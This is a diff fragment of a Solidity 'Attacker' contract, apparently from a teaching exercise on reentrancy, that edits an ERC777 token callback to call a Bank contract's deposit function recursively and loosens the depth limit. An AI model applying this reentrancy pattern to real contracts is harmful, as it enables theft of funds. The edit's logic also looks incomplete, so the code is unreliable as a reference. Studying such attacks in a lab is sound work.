@@ -67,13 +67,13 @@ contract Attacker is AccessControl, IERC777Recipient {
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
 		require(msg.sender == address(bank.token()), "Invalid token");
-    	require(depth < max_depth, "Max depth reached");
+    	require(depth < max_depth+5, "Max depth reached");
 
     	depth++;
     	emit Recurse(depth);
-    	emit Recurse(depth);
+    	
     	// Call the deposit() function of the Bank contract again
-    	//bank.deposit{value: 1 ether}();
+    	bank.deposit{value: 1 ether}();
 
     	depth--;
 
